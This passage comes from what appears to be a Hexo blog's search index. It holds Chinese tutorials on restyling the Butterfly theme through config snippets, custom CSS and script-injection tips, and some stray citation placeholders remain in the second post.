href="#4-4-右下角按钮：保留功能，但更“干净”" class="headerlink" title="4.4 右下角按钮：保留功能，但更“干净”"></a>4.4 右下角按钮：保留功能，但更“干净”</h3><p>你已经开启 readmode、darkmode（很实用）。建议：</p><ul><li>关闭滚动百分比（你目前就是 false）</li><li>保留 <code>darkmode.button: true</code> 很好</li><li><code>rightside_config_animation</code> 若你想更克制，可设为 false</li></ul><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">rightside_config_animation:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="4-5-侧边栏：保留核心功能，删掉“可有可无”"><a href="#4-5-侧边栏：保留核心功能，删掉“可有可无”" class="headerlink" title="4.5 侧边栏：保留核心功能，删掉“可有可无”"></a>4.5 侧边栏：保留核心功能，删掉“可有可无”</h3><p>你现在 aside 卡片比较全。极简建议保留：</p><ul><li>作者信息（card_author）</li><li>公告（可以更短）</li><li>最近文章（limit 5）</li><li>分类（limit 8）</li><li>标签（建议改为 20~30 且按 name 或 length）</li><li>归档（limit 6~8）</li><li>站点信息（可选：PV/UV 对极简站点可能偏“噪音”）</li></ul><p>建议调整为：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">archive:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">tag:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">category:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_announcement:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">"内容较杂，建议使用搜索。"</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_recent_post:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_tags:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">25</span></span><br><span class="line">    <span class="attr">color:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">orderby:</span> <span class="string">name</span></span><br><span class="line">    <span class="attr">order:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_archives:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">card_webinfo:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="4-6-访问统计：极简风建议默认关闭（隐私-噪音）"><a href="#4-6-访问统计：极简风建议默认关闭（隐私-噪音）" class="headerlink" title="4.6 访问统计：极简风建议默认关闭（隐私 &amp; 噪音）"></a>4.6 访问统计：极简风建议默认关闭（隐私 &amp; 噪音）</h3><p>你现在启用了 busuanzi 的 UV/PV。极简取向常见做法是关闭：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi:</span></span><br><span class="line">  <span class="attr">site_uv:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">site_pv:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">page_pv:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="4-7-外链特效脚本：建议移除（稳定性-简洁）"><a href="#4-7-外链特效脚本：建议移除（稳定性-简洁）" class="headerlink" title="4.7 外链特效脚本：建议移除（稳定性 + 简洁）"></a>4.7 外链特效脚本：建议移除（稳定性 + 简洁）</h3><p>你当前注入：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>极简方案：<strong>删掉</strong>这些装饰脚本，只保留你真正需要的 CSS/JS。</p><p>建议只保留自定义样式注入：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel="stylesheet"</span> <span class="string">href="/css/custom.css"&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="5-极简风“质感核心”：自定义-CSS（建议直接抄）"><a href="#5-极简风“质感核心”：自定义-CSS（建议直接抄）" class="headerlink" title="5. 极简风“质感核心”：自定义 CSS（建议直接抄）"></a>5. 极简风“质感核心”：自定义 CSS（建议直接抄）</h2><p>在 <code>source/css/custom.css</code> 新建并写入：</p><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* ===== 极简阅读体验：整体排版 ===== */</span></span><br><span class="line"><span class="selector-pseudo">:root</span> {</span><br><span class="line">  <span class="attr">--global-font-size</span>: <span class="number">16px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正文宽度与行距：让内容更耐读 */</span></span><br><span class="line"><span class="selector-class">.post-content</span> {</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.9</span>;</span><br><span class="line">  <span class="attribute">letter-spacing</span>: <span class="number">0.2px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 标题间距：更像“编辑排版” */</span></span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">h1</span>,</span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">h2</span>,</span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">h3</span> {</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">1.6em</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">0.8em</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 段落间距：减少拥挤感 */</span></span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">p</span> {</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0.9em</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 卡片阴影：更克制（减少“花”感） */</span></span><br><span class="line"><span class="selector-class">.card-widget</span>,</span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span> {</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">26px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">06</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">14px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 图片：统一圆角 + 轻阴影（增强质感但不过分） */</span></span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">img</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">24px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">10</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 引用：更“文本化”，减少强烈色块 */</span></span><br><span class="line"><span class="selector-tag">blockquote</span> {</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">3px</span> solid <span class="built_in">rgba</span>(<span class="number">120</span>,<span class="number">120</span>,<span class="number">120</span>,.<span class="number">35</span>);</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">120</span>,<span class="number">120</span>,<span class="number">120</span>,.<span class="number">06</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 代码块：更像“文档”，不强调花哨 */</span></span><br><span class="line"><span class="selector-tag">figure</span><span class="selector-class">.highlight</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>并在 <code>_config.butterfly.yml</code> 注入：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel="stylesheet"</span> <span class="string">href="/css/custom.css"&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="6-评论系统的“极简建议”（可选）"><a href="#6-评论系统的“极简建议”（可选）" class="headerlink" title="6. 评论系统的“极简建议”（可选）"></a>6. 评论系统的“极简建议”（可选）</h2><p>你现在用 Valine，能用，但如果你希望：</p><ul><li>更少后端维护</li><li>更符合 GitHub 技术社区习惯</li><li>更简洁一致</li></ul><p>可以考虑换 <strong>Giscus</strong>（基于 GitHub Discussions）。<br>如果继续 Valine 也可以，极简站点的关键是：<strong>评论区样式克制 + 懒加载（可选）</strong>。</p><hr><h2 id="7-让“文章页默认无头图”：从根源解决（推荐）"><a href="#7-让“文章页默认无头图”：从根源解决（推荐）" class="headerlink" title="7. 让“文章页默认无头图”：从根源解决（推荐）"></a>7. 让“文章页默认无头图”：从根源解决（推荐）</h2><p>如果你采用“首页保留头图、文章页关闭头图”的折中方案：</p><h3 id="7-1-新文章模板里默认带上-top-img-false"><a href="#7-1-新文章模板里默认带上-top-img-false" class="headerlink" title="7.1 新文章模板里默认带上 top_img: false"></a>7.1 新文章模板里默认带上 top_img: false</h3><p>你可以在 <code>scaffolds/post.md</code>（或你使用的 scaffold）里加上：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">top_img:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><p>这样以后每篇新文章天生就是极简阅读模式。</p><hr><h2 id="8-实操顺序（照着做，不容易崩）"><a href="#8-实操顺序（照着做，不容易崩）" class="headerlink" title="8. 实操顺序（照着做，不容易崩）"></a>8. 实操顺序（照着做，不容易崩）</h2><ol><li>先改首页摘要与字幕（立刻见效）</li><li>再弱化/关闭文章页头图（阅读质感直接提升）</li><li>删除 fishes.js + jQuery（稳定性 + 极简一致性）</li><li>侧边栏做减法（保留：搜索/分类/归档/最近文章）</li><li>加上 custom.css 微调排版（最后打磨质感）</li></ol><hr><h2 id="9-部署流程（备忘）"><a href="#9-部署流程（备忘）" class="headerlink" title="9. 部署流程（备忘）"></a>9. 部署流程（备忘）</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="结语：极简不是“少”，而是“恰好”"><a href="#结语：极简不是“少”，而是“恰好”" class="headerlink" title="结语：极简不是“少”，而是“恰好”"></a>结语：极简不是“少”，而是“恰好”</h2><p>当你把“头图、动效、噪音”拿掉之后，读者会更愿意：</p><ul><li>停下来读完一篇文章</li><li>用搜索去翻你写过的内容</li><li>关注你在写什么，而不是你在“怎么装饰”</li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客日常维护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主题美化教程</title>
      <link href="/2026/01/29/%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/"/>
      <url>/2026/01/29/%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-Butterfly-主题美化教程"><a href="#Hexo-Butterfly-主题美化教程" class="headerlink" title="Hexo Butterfly 主题美化教程"></a>Hexo Butterfly 主题美化教程</h1><blockquote><p>适用对象：已经用 Hexo 搭好博客，并使用 <strong>Butterfly</strong> 主题，想把站点“变好看 + 更好用 + 更顺手维护”。  </p><p>说明：Butterfly 的配置项很多，本文按「<strong>最常改、最影响观感、最容易踩坑</strong>」的顺序整理，并给出可直接抄用的配置片段。<br>参考资料主要来自 Butterfly 官方文档与主题仓库，以及若干配置/美化实践文章。:contentReference[oaicite:0]{index=0}</p></blockquote><hr><h2 id="0-美化前的原则（强烈建议先看）"><a href="#0-美化前的原则（强烈建议先看）" class="headerlink" title="0. 美化前的原则（强烈建议先看）"></a>0. 美化前的原则（强烈建议先看）</h2><ol><li><strong>站点配置与主题配置分离</strong>：把主题的 <code>_config.yml</code> 复制到根目录并命名 <code>_config.butterfly.yml</code>，之后只改这个文件，升级主题更省心。:contentReference[oaicite:1]{index=1}  </li><li><strong>自定义样式不要魔改主题源码</strong>：优先走 <code>inject</code> 注入自定义 CSS/JS；确实需要改源码时再动。:contentReference[oaicite:2]{index=2}  </li><li><strong>每次改完都要本地预览</strong>：<code>hexo s</code> 看效果，确认无误再 <code>hexo d -g</code>。</li></ol><hr><h2 id="1-推荐的目录结构（让后期维护更舒服）"><a href="#1-推荐的目录结构（让后期维护更舒服）" class="headerlink" title="1. 推荐的目录结构（让后期维护更舒服）"></a>1. 推荐的目录结构（让后期维护更舒服）</h2><p>在 Hexo 根目录建议这样组织：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line">.</span><br><span class="line">├─ _config.yml                 # 站点配置（标题、作者、URL、部署等）</span><br><span class="line">├─ _config.butterfly.yml       # 主题配置（美化主要都在这）</span><br><span class="line">├─ source/</span><br><span class="line">│  ├─ _posts/                  # 文章</span><br><span class="line">│  ├─ about/                   # 页面</span><br><span class="line">│  ├─ css/</span><br><span class="line">│  │  └─ custom.css            # 自定义样式（推荐）</span><br><span class="line">│  └─ js/</span><br><span class="line">│     └─ custom.js             # 自定义脚本（推荐）</span><br><span class="line">└─ themes/</span><br><span class="line">└─ butterfly/               # 主题本体（尽量少改）</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>Butterfly 官方也建议使用 <code>_config.butterfly.yml</code> 来降低升级成本。:contentReference[oaicite:3]{index=3}</p></blockquote><hr><h2 id="2-快速美化第一步：注入自定义-CSS-JS（最常用）"><a href="#2-快速美化第一步：注入自定义-CSS-JS（最常用）" class="headerlink" title="2. 快速美化第一步：注入自定义 CSS/JS（最常用）"></a>2. 快速美化第一步：注入自定义 CSS/JS（最常用）</h2><p>Butterfly 支持 <code>inject</code> 注入外部文件（不改源码也能“魔改”）。:contentReference[oaicite:4]{index=4}</p><h3 id="2-1-在-source-css-custom-css-写样式"><a href="#2-1-在-source-css-custom-css-写样式" class="headerlink" title="2.1 在 source/css/custom.css 写样式"></a>2.1 在 <code>source/css/custom.css</code> 写样式</h3><p>新建文件：<code>source/css/custom.css</code></p><p>示例（先给你一套“常用观感提升”模板，后面会继续加）：</p><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* ===== 全局：字体与排版微调（按需改） ===== */</span></span><br><span class="line"><span class="selector-pseudo">:root</span> {</span><br><span class="line">  <span class="attr">--global-font-size</span>: <span class="number">16px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文章内容宽度 &amp; 行高（阅读更舒服） */</span></span><br><span class="line"><span class="selector-class">.post-content</span> {</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.85</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 卡片阴影更柔和（更“现代”一点） */</span></span><br><span class="line"><span class="selector-class">.card-widget</span>,</span><br><span class="line"><span class="selector-class">.layout</span> &gt; <span class="selector-tag">div</span><span class="selector-pseudo">:first-child</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.recent-posts</span>),</span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span> {</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">30px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">08</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 图片圆角（更统一） */</span></span><br><span class="line"><span class="selector-tag">img</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="2-2-在-config-butterfly-yml-注入"><a href="#2-2-在-config-butterfly-yml-注入" class="headerlink" title="2.2 在 _config.butterfly.yml 注入"></a>2.2 在 <code>_config.butterfly.yml</code> 注入</h3><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel="stylesheet"</span> <span class="string">href="/css/custom.css"&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src="/js/custom.js"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>inject</code> 的思路与注意事项可以参考一些进阶美化文章（尤其是引入外部文件与 JS 的位置）。(<a href="https://www.cnblogs.com/thinkgone/p/16348996.html?utm_source=chatgpt.com" title="Butterfly主题美化进阶 - ThinkGone - 博客园">博客园</a>)</p></blockquote><hr><h2 id="3-站点“第一眼”美化：主页头图-背景-暗色模式"><a href="#3-站点“第一眼”美化：主页头图-背景-暗色模式" class="headerlink" title="3. 站点“第一眼”美化：主页头图 / 背景 / 暗色模式"></a>3. 站点“第一眼”美化：主页头图 / 背景 / 暗色模式</h2><blockquote><p>Butterfly 版本与配置会迭代，建议随时对照官方文档对应章节。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p></blockquote><h3 id="3-1-头图（page-header-cover）与站点背景"><a href="#3-1-头图（page-header-cover）与站点背景" class="headerlink" title="3.1 头图（page header / cover）与站点背景"></a>3.1 头图（page header / cover）与站点背景</h3><p>通常你会在主题配置里找到与 <strong>头图、背景、封面</strong> 相关的配置项（例如全局默认头图、各页面头图、是否显示/透明等）。</p><p>你可以做的美化方向：</p><ul><li>选一张高质量、风格统一的头图（建议 1920×1080 或更大）</li><li>主页头图 + 文章页头图可分开（更有层次）</li><li>背景建议：纯色 / 微纹理 / 浅渐变（花图做背景会影响阅读）</li></ul><p><strong>一个常见的“清爽感”技巧：让页脚和头图更通透</strong>（示例来自社区魔改实践）(<a href="https://blog.codejerry.cn/posts/hexomogai/index.html?utm_source=chatgpt.com" title="hexo-butterfly魔改美化 | Yan Zhang's blog">Yan Zhang’s blog</a>)</p><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* 页脚与头图透明（按主题实际结构可调整） */</span></span><br><span class="line"><span class="selector-id">#footer</span> {</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#page-header</span> {</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="3-2-暗色模式（Dark-Mode）"><a href="#3-2-暗色模式（Dark-Mode）" class="headerlink" title="3.2 暗色模式（Dark Mode）"></a>3.2 暗色模式（Dark Mode）</h3><p>暗色模式非常“加分”，也能提升夜间阅读体验。Butterfly 自带相关能力（一般在配置里开关/策略）。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p><p>美化建议：</p><ul><li>暗色下减少纯黑，偏深灰更舒适</li><li>链接、代码块颜色要保证对比度</li><li>图片可加轻微边框/阴影避免“融进背景”</li></ul><hr><h2 id="4-导航栏与菜单：让访客更愿意逛"><a href="#4-导航栏与菜单：让访客更愿意逛" class="headerlink" title="4. 导航栏与菜单：让访客更愿意逛"></a>4. 导航栏与菜单：让访客更愿意逛</h2><p>你大概率会改的：</p><ul><li>菜单结构（主页/归档/分类/标签/友链/关于）</li><li>图标（Font Awesome）</li><li>二级菜单（生活/相册/项目等）</li></ul><p>社区常见写法示例（可按你站点路径改）：(<a href="https://blog.csdn.net/mjh1667002013/article/details/129290903?utm_source=chatgpt.com" title="【Hexo】Hexo搭建Butterfly主题并快速美化 - CSDN博客">CSDN博客</a>)</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">主页:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">归档:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="string">分类:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="string">标签:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="string">友链:</span> <span class="string">/links/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-link</span></span><br><span class="line">  <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-heart</span></span><br></pre></td></tr></tbody></table></figure><p><strong>建议</strong></p><ul><li>菜单不要太长：6~8 个足够</li><li>把高频入口放前面（文章、归档、分类、标签）</li><li>“关于/友链/留言”放后面</li></ul><hr><h2 id="5-主页文章卡片：卡片风格、摘要、封面图（质感核心）"><a href="#5-主页文章卡片：卡片风格、摘要、封面图（质感核心）" class="headerlink" title="5. 主页文章卡片：卡片风格、摘要、封面图（质感核心）"></a>5. 主页文章卡片：卡片风格、摘要、封面图（质感核心）</h2><p>Butterfly 的卡片 UI 是它的亮点之一。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p><h3 id="5-1-文章封面图（Cover）"><a href="#5-1-文章封面图（Cover）" class="headerlink" title="5.1 文章封面图（Cover）"></a>5.1 文章封面图（Cover）</h3><p>建议你为每篇文章设置封面图（统一风格）：</p><ul><li>统一比例：16:9 或 4:3</li><li>同一主题系列文章可用相似风格图</li><li>图源建议：自己做/摄影/免费版权站（注意版权）</li></ul><h3 id="5-2-摘要策略"><a href="#5-2-摘要策略" class="headerlink" title="5.2 摘要策略"></a>5.2 摘要策略</h3><p>摘要可选：</p><ul><li>自动截取（省事）</li><li>在文章里手动 <code>&lt;!-- more --&gt;</code>（更可控）</li><li>首页只显示标题+少量摘要（更干净）</li></ul><p>推荐：重要文章用 <code>&lt;!-- more --&gt;</code>，日常记录自动截取。</p><hr><h2 id="6-侧边栏与个人信息：头像、简介、社交链接"><a href="#6-侧边栏与个人信息：头像、简介、社交链接" class="headerlink" title="6. 侧边栏与个人信息：头像、简介、社交链接"></a>6. 侧边栏与个人信息：头像、简介、社交链接</h2><p>侧边栏是“个人名片”，建议：</p><ul><li>头像：高清、统一风格</li><li>简介：一句话说明你写什么（技术 / 生活 / 读书 / 项目）</li><li>社交：GitHub、邮箱、B 站等（别堆太多）</li></ul><p>你可以把站点固定信息放 <code>_config.yml</code>，主题展示相关放 <code>_config.butterfly.yml</code>（官方/社区都提倡这样分离）。(<a href="https://blog.csdn.net/mjh1667002013/article/details/129290903?utm_source=chatgpt.com" title="【Hexo】Hexo搭建Butterfly主题并快速美化 - CSDN博客">CSDN博客</a>)</p><hr><h2 id="7-代码块与高亮：技术博客观感的关键"><a href="#7-代码块与高亮：技术博客观感的关键" class="headerlink" title="7. 代码块与高亮：技术博客观感的关键"></a>7. 代码块与高亮：技术博客观感的关键</h2><p>技术博客最容易“丑”的地方就是代码块：</p><p>建议方向：</p><ul><li>选择一个你喜欢的高亮主题（浅色/暗色各一套）</li><li>让代码块与正文区分明确（背景、圆角、行距）</li><li>开启行号（可选，长代码更友好）</li><li>复制按钮（强烈推荐）</li></ul><p>Butterfly 通常提供代码高亮相关配置项，你可在主题配置里搜索 <code>highlight</code> / <code>prism</code> / <code>code</code> 等关键词进行调整（不同版本项名略有差异）。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p><hr><h2 id="8-评论系统（可选，但“互动感”很加分）"><a href="#8-评论系统（可选，但“互动感”很加分）" class="headerlink" title="8. 评论系统（可选，但“互动感”很加分）"></a>8. 评论系统（可选，但“互动感”很加分）</h2><p>常见选择（按你偏好）：</p><ul><li>Waline（自建/无登录也能评论）</li><li>Twikoo</li><li>Giscus（GitHub Discussions 驱动，偏程序员风格）</li><li>Valine（老牌，但需要 LeanCloud）</li></ul><p>建议你选一个“维护成本低”的：<strong>Giscus</strong> 或 <strong>Waline</strong>。</p><blockquote><p>Butterfly 对多种评论系统有支持/适配说明，具体按官方文档对应章节配置。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p></blockquote><hr><h2 id="9-搜索（强烈建议开）：站内内容多了后必备"><a href="#9-搜索（强烈建议开）：站内内容多了后必备" class="headerlink" title="9. 搜索（强烈建议开）：站内内容多了后必备"></a>9. 搜索（强烈建议开）：站内内容多了后必备</h2><p>常见方案：</p><ul><li>Local Search（本地搜索，简单易用）</li><li>Algolia（更强，但需要配置服务）</li></ul><p>你文章超过 30 篇就能明显感受到搜索的价值。</p><hr><h2 id="10-PJAX-与“插件不生效”坑：美化时最常踩"><a href="#10-PJAX-与“插件不生效”坑：美化时最常踩" class="headerlink" title="10. PJAX 与“插件不生效”坑：美化时最常踩"></a>10. PJAX 与“插件不生效”坑：美化时最常踩</h2><p>Butterfly 内置 PJAX（无刷新切换），体验更顺滑，但容易导致：</p><ul><li>某些第三方 JS 在切换页面后不重新执行（比如页脚动画、看板娘等）</li><li>需要给脚本加 <code>data-pjax</code> 或在 PJAX 回调里重新初始化</li></ul><p>例如“页脚养鱼”在 PJAX 下不生效的修复思路：给脚本加 <code>defer data-pjax</code>。(<a href="https://ihave.news/post/20240818194045.html?utm_source=chatgpt.com" title="解决Butterfly页脚养鱼在切换页面时不生效的问题 | 天澄拾光">天澄拾光</a>)</p><p>示例（仅示意）：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src=".../fishes.js"</span> <span class="string">defer</span> <span class="string">data-pjax&gt;&lt;/script&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>如果你开启 PJAX，<strong>任何“只在首次加载执行一次”的脚本</strong>都要重点测试。(<a href="https://cloud.tencent.com/developer/article/1834038?utm_source=chatgpt.com" title="Butterfly的Pjax适配方案-腾讯云开发者社区-腾讯云">腾讯云</a>)</p></blockquote><hr><h2 id="11-一套“推荐美化清单”（照着做就会明显变好看）"><a href="#11-一套“推荐美化清单”（照着做就会明显变好看）" class="headerlink" title="11. 一套“推荐美化清单”（照着做就会明显变好看）"></a>11. 一套“推荐美化清单”（照着做就会明显变好看）</h2><h3 id="11-1-必做（10-分钟见效）"><a href="#11-1-必做（10-分钟见效）" class="headerlink" title="11.1 必做（10 分钟见效）"></a>11.1 必做（10 分钟见效）</h3><ul><li>使用 <code>_config.butterfly.yml</code> 管理主题配置（避免升级痛苦）(<a href="https://butterfly.js.org/en/posts/butterfly-docs-en-get-started/?utm_source=chatgpt.com" title="Butterfly document - Get Started">Butterfly</a>)</li><li>注入 <code>custom.css</code>：圆角、阴影、排版、图片样式</li><li>调好菜单结构（不超过 8 个入口）</li><li>统一封面图风格 + 摘要策略</li></ul><h3 id="11-2-进阶（1-2-小时）"><a href="#11-2-进阶（1-2-小时）" class="headerlink" title="11.2 进阶（1~2 小时）"></a>11.2 进阶（1~2 小时）</h3><ul><li>暗色模式适配（尤其代码块、引用块）</li><li>评论 + 搜索（增强可用性）</li><li>PJAX 开启后逐个排查脚本兼容</li></ul><h3 id="11-3-高级（长期迭代）"><a href="#11-3-高级（长期迭代）" class="headerlink" title="11.3 高级（长期迭代）"></a>11.3 高级（长期迭代）</h3><ul><li>自定义页面：友链页、项目页、相册页</li><li>加“阅读进度”“回到顶部”“文章目录”细节</li><li>性能优化：图片压缩、懒加载、CDN</li></ul><hr><h2 id="12-附：可直接抄用的“美化模板片段”"><a href="#12-附：可直接抄用的“美化模板片段”" class="headerlink" title="12. 附：可直接抄用的“美化模板片段”"></a>12. 附：可直接抄用的“美化模板片段”</h2><h3 id="12-1-引入自定义-CSS-JS"><a href="#12-1-引入自定义-CSS-JS" class="headerlink" title="12.1 引入自定义 CSS/JS"></a>12.1 引入自定义 CSS/JS</h3><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span 